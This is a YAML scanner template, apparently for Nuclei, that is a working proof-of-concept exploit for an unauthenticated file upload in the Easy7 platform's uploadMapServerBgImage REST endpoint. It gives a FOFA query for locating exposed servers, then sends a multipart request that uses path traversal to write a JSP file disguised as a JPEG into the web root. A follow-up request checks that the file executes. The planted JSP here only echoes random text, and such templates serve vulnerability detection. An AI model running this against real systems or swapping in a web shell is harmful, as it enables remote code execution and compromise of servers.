id: poc-Easy7-uploadMapServerBgImage-uploadfile

info:
  name: poc-Easy7-uploadMapServerBgImage-uploadfile
  author: PokerSec
  severity: critical
  metadata:
    fofa-search: body="/images/ico/Easy7_logo_transparent.png"
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}"
  file_content: "{{to_lower(rand_text_alpha(8))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |-
        POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----{{boundary}}

        ------{{boundary}}
        Content-Disposition: form-data; name="uploadParams";

        [{"path":"../Easy7/","name":"{{file_name}}.jsp"}]
        ------{{boundary}}
        Content-Disposition: form-data; name="file"; filename="{{file_name}}.jsp"
        Content-Type: image/jpeg

        <% out.println("{{file_content}}");%>
        ------{{boundary}}--

      - |+
        GET /Easy7/{{file_name}}.jsp HTTP/1.1
        Host: {{Hostname}}
        
    matchers-condition: and
    matchers:
      - type: dsl
        condition: and
        dsl:
          - status_code_1==200 && status_code_2==200 && contains_all(body_2,"{{file_content}}")